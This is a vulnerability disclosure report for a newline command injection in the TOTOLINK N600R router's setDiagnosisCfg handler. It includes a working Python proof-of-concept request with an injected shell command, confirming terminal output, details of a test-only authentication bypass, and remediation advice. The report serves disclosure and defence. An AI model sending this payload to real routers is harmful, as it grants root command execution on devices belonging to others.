# TOTOLINK N600R V4.3.0cu.7866_B20220506 was discovered to contain a command injection vulnerability in setDiagnosisCfg

## Overview

- Vendor: TOTOLINK
- Product: N600R
- Version: V4.3.0cu.7866_B20220506
- Component: cstecgi.cgi setting/setDiagnosisCfg
- Vulnerability Class: CWE-78 command injection / CWE-184 incomplete deny-list
- Manufacturer: https://www.totolink.net/

## Affected version

- Package.
- `cstecgi.cgi`.

## Vulnerability details

`setDiagnosisCfg` passes the `ipDoamin` parameter into a `sprintf("ping %s ...")`
command and then `system`. The `Validity_check` deny-list does not reject
newline, so a value such as `127.0.0.1\necho PWNED > /tmp/pwned\n` breaks out
of the ping command. The handler is authenticated (token) unless the
`/var/kkkkkk` test bypass exists; the dynamic test used a test-only copy with
that marker file so the handler could be reached without a token.

## PoC

```python
import requests
url = "http://<router>/cgi-bin/cstecgi.cgi"
body = {
    "token": "<valid token if required>",
    "topicurl": "setting/setDiagnosisCfg",
    "actionFlag": "1",
    "ipDoamin": "127.0.0.1\necho PWNED > /tmp/pwned\n",
}
print(requests.post(url, json=body, timeout=10).text)
```

## Reproduction and terminal evidence

Environment: qemu-user N600R rootfs + firmware lighttpd. Test-only
`/var/kkkkkk` marker skips the token check; `setDiagnosisCfg` and `system` are
unchanged.

Terminal transcript:

```
POST /cgi-bin/cstecgi.cgi -> {"Result":"Success"}
$ cat /tmp/pwned
PWNED
```

## Verification

The vulnerable handler in the stock `cstecgi.cgi setting/setDiagnosisCfg` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Authenticated (or CSRF) root command execution. If the `/var/kkkkkk` state
can be created by an unauthenticated path, the issue becomes pre-auth.

## Remediation

- Validate `ipDoamin` as an IP address or hostname allow-list.
- Reject CR/LF and shell metacharacters; use `execve`/argv for `ping`.
- Remove the `/var/kkkkkk` authentication bypass.

## Known CVE relation

**CVE candidate type: incomplete-fix variant of CVE-2022-28908 — candidate new CVE.**

- CVE-2022-28908 covers an older N600R `setDiagnosisCfg` issue; this newer
  version still accepts newline in the deny-list. NVD N600R `setDiagnosisCfg`
  has no exact record for this build (2026-11-06).

## Status and disclosure

Dynamic confirmation (qemu-user; handler unchanged; test-only auth marker).
Candidate new CVE — incomplete-fix variant of CVE-2022-28908; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
TOTOLINK

### Product
N600R

### Version or Commit
V4.3.0cu.7866_B20220506

### Vulnerability Class
CWE-78 command injection / CWE-184 incomplete deny-list

### CVE_candidate_type
incomplete-fix variant of CVE-2022-28908 — candidate new CVE

### Description
setDiagnosisCfg passes ipDoamin into sprintf("ping %s ...") and system(). The Validity_check deny-list does not reject newline, so a value such as 127.0.0.1\necho PWNED > /tmp/pwned breaks out of the ping command.

### Affected_component
cstecgi.cgi setting/setDiagnosisCfg

### Attack_vector
Authenticated POST to cstecgi.cgi with topicurl=setting/setDiagnosisCfg and ipDoamin containing a newline.

### Product_version
N600R V4.3.0cu.7866_B20220506

### Reference
- https://www.totolink.net/
- https://github.com/vuln-1/vuln/blob/main/TOTOLINK/N600R_V4.3.0cu.7866_B20220506/report-2.md
```
